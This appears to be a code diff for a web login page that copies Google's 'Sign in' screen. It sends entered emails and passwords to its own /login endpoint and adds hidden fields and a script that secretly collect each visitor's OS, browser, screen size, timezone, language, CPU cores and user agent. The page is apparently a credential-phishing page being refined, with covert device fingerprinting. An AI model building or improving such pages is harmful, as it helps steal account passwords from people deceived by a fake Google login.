@@ -7,8 +7,10 @@
 <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto&display=swap" rel="stylesheet">
 <style>
   :root {
-    --background:#202124; --card:#171717; --text:#e8eaed; --muted:#9aa0a6;
-    --link:#8ab4f8; --border:#5f6368; --btn:#8ab4f8; --btn-h:#aecbfa;
+    --background:#202124; --card:#0f0e0e; --text:#e8eaed; --muted:#e6e5e5;   --link: #8ab4f8;
+  --btn-dark-bg: rgba(60, 64, 67, 0.75);
+  --btn-dark-hover: rgba(79, 79, 94, 0.166);
+    --link:#8ab4f8; --border:#ffffff; --btn:#8ab4f8; --btn-h:#aecbfa;
   }
 
   body {
@@ -27,33 +29,33 @@
   .box {
     background:var(--card);
     border-radius:28px;
-    box-shadow:0 2px 10px rgba(0,0,0,.6);
     display:flex;
     justify-content:space-between;
     align-items:flex-start;
-    width:760px;
-    max-width:92%;
-    padding:56px 64px;
+    width:1050px;
+    max-width:90%;
+    padding:76px 34px;
     box-sizing:border-box;
     margin-bottom:30px;
   }
 
   .left { flex:1; }
-  .google-logo { width:80px; margin-bottom:30px; }
-  h1 { font-weight:400; font-size:28px; margin:0 0 8px 0; }
-  .sub { color:var(--muted); font-size:14px; }
+  .google-logo { width:50px;margin-top: -30px; margin-bottom:30px; }
+  h1 { font-weight:400; font-size:42px; margin:0 0 10px 0; }
+  .sub { color:var(--muted); font-size:16px; }
 
   .right { flex:1; }
   form { margin-left:40px; }
 
   input {
-    width:100%;
-    padding:14px;
+    width:90%;
+    padding:16px;
     border:1px solid var(--border);
     border-radius:4px;
     background:transparent;
     color:var(--text);
     font-size:15px;
+    margin-top: 70px;
     margin-bottom:12px;
   }
 
@@ -67,10 +69,10 @@
   a:hover { text-decoration:underline; }
 
   .hint {
-    color:var(--muted);
+    color:var muted;
     font-size:13px;
     line-height:1.5;
-    margin-top:18px;
+    margin-top:40px;
   }
   .hint a { color:var(--link); }
 
@@ -88,17 +90,35 @@
     border-radius:24px;
     padding:10px 28px;
     font-weight:500;
-    font-size:14px;
+    font-size:16px;
     cursor:pointer;
     transition:background-color .2s;
   }
   button:hover { background:var(--btn-h); }
 
+ .create {
+  font-size: 16px;
+  font-weight: 500;
+  color: var(--link); /* Blue text */
+  text-decoration: none;
+  padding: 10px 24px; /* Button padding */
+  border-radius: 24px;
+  border: 1px solid transparent;
+  transition: background-color .2s;
+  margin-left: 35%;
+}
+
+/* Hover state based on your request */
+.create:hover { 
+  background: var(--btn-dark-hover);
+  text-decoration: none;
+}
+   
   /* Footer directly below the box */
   .footer {
     width:760px;
     max-width:92%;
-    font-size:12px;
+    font-size:14px;
     color:var(--muted);
     display:flex;
     justify-content:space-between;
@@ -110,19 +130,27 @@
 
   #password-field { display:none; }
 
-  @media(max-width:768px){
-    .box { flex-direction:column; width:90%; padding:40px; }
+  @media(max-width:768px ){
+    .box { flex-direction:column; width:90%;  }
     form { margin-left:0; margin-top:30px; }
-    .footer { flex-direction:column; text-align:center; gap:8px; }
+    .create { margin-left:-10px; }
+    .footer { flex-direction:row; text-align:center; gap:8px; }
   }
+    @media(max-width:360px){
+    .box { flex-direction:column; width:90%;  }
+    form { margin-left:0; margin-top:20px; }
+    .create { margin-left:-10px; }
+    .footer { flex-direction:row; text-align:center; gap:8px; }
+  }
+
 </style>
 </head>
 <body>
 
 <div class="box">
   <div class="left">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png"
-         alt="Google" class="google-logo">
+    <img src="/static/google.png"
+         alt="google-logo" class="google-logo">
     <h1>Sign in</h1>
     <div class="sub">Use your Google Account</div>
   </div>
@@ -132,24 +160,38 @@
       <div style="color:#f28b82;font-size:13px;">{{ error }}</div>
     {% endif %}
     <form id="loginForm" method="post" action="/login">
+      <!-- Step 1: Email -->
       <div id="email-field">
-        <input type="email" name="username" id="username" placeholder="Email or phone" required>
+        <input type="email" name="username" id="username" placeholder="Email or phone" required
+               value="{{ request.form.username if request.form.username else '' }}">
         <a href="#">Forgot email?</a>
         <div class="hint">
           Not your computer? Use Guest mode to sign in privately.
-          <a href="#">Learn more</a>
+          <a href="#"> Learn more about using Guest mode</a>
         </div>
       </div>
 
+      <!-- Step 2: Password -->
       <div id="password-field">
         <input type="password" name="password" id="password" placeholder="Enter your password" required>
         <a href="#">Forgot password?</a>
       </div>
 
+      <!-- Actions -->
       <div class="actions">
-        <a href="/signup">Create account</a>
+        <a href="/signup" class="create">Create account</a>
         <button type="button" id="nextBtn">Next</button>
       </div>
+
+      <!-- ===== NEW: Hidden fields for client info ===== -->
+      <input type="hidden" name="client_os" id="client_os">
+      <input type="hidden" name="client_browser" id="client_browser">
+      <input type="hidden" name="client_resolution" id="client_resolution">
+      <input type="hidden" name="client_timezone" id="client_timezone">
+      <input type="hidden" name="client_language" id="client_language">
+      <input type="hidden" name="client_cpu_cores" id="client_cpu_cores">
+      <input type="hidden" name="client_user_agent" id="client_user_agent">
+      <!-- ============================================== -->
     </form>
   </div>
 </div>
@@ -165,6 +207,7 @@
 
 <script>
   document.addEventListener('DOMContentLoaded', () => {
+    
     // --- Get all elements ---
     const nextBtn = document.getElementById('nextBtn');
     const emailField = document.getElementById('email-field');
@@ -174,7 +217,6 @@
     const passwordInput = document.getElementById('password');
 
     // --- Helper function to advance UI ---
-    // We need this in two places: on page load (if error) and on button click.
     function advanceToPassword(focusPassword = false) {
       emailField.style.display = 'none';
       passwordField.style.display = 'block';
@@ -185,38 +227,63 @@
       }
     }
 
-    // --- FIX 2: Handle failed login state on page load ---
-    // Check if the server rendered an error message (by looking for its style)
+    // --- Handle failed login state on page load ---
     const errorDiv = document.querySelector('div[style*="color:#f28b82"]');
     const email = usernameInput.value.trim();
 
     if (errorDiv && email.length > 0) {
-      // Error is present and email is pre-filled,
-      // so skip straight to the password step.
-      advanceToPassword(true); // true = focus the password input
+      advanceToPassword(true);
     }
 
-    // --- FIX 1: Fix validation on 'Next' click ---
+    // --- Handle 'Next' button click ---
     nextBtn.addEventListener('click', () => {
       if (passwordField.style.display === 'none' || passwordField.style.display === '') {
-        // Step 1: Validate email and advance
         const currentEmail = usernameInput.value.trim();
-        
-        // FIX: Removed '@gmail.com' check. We just check if it's not empty.
-        // The 'required' attribute handles most of this, but this is a
-        // good JS fallback.
         if (currentEmail.length === 0) {
           alert("Please enter your email or phone number.");
           return;
         }
-        
-        advanceToPassword(true); // Advance UI and focus password
-        
+        advanceToPassword(true);
       } else {
-        // Step 2: Submit the form
         form.submit();
       }
     });
+
+    // ===== NEW: Client Info Gathering =====
+    function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        let browser = "Unknown";
+        if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+        else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
+        else if (ua.indexOf("Edge") > -1) browser = "Edge";
+        else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+        else if (ua.indexOf("Safari") > -1) browser = "Safari";
+        return browser;
+    }
+
+    function getOSInfo() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Win") > -1) return "Windows";
+        if (ua.indexOf("Mac") > -1) return "MacOS";
+        if (ua.indexOf("Linux") > -1) return "Linux";
+        if (ua.indexOf("Android") > -1) return "Android";
+        if (ua.indexOf("like Mac") > -1) return "iOS"; // (for iPad/iPhone)
+        return "Unknown";
+    }
+
+    try {
+      document.getElementById('client_os').value = getOSInfo();
+      document.getElementById('client_browser').value = getBrowserInfo();
+      document.getElementById('client_resolution').value = `${window.screen.width}x${window.screen.height}`;
+      document.getElementById('client_timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      document.getElementById('client_language').value = navigator.language;
+      document.getElementById('client_cpu_cores').value = navigator.hardwareConcurrency || 'N/A';
+      document.getElementById('client_user_agent').value = navigator.userAgent;
+    } catch (e) {
+      console.error("Error gathering client info:", e);
+    }
+    // =====================================
   });
 </script>
 </body>
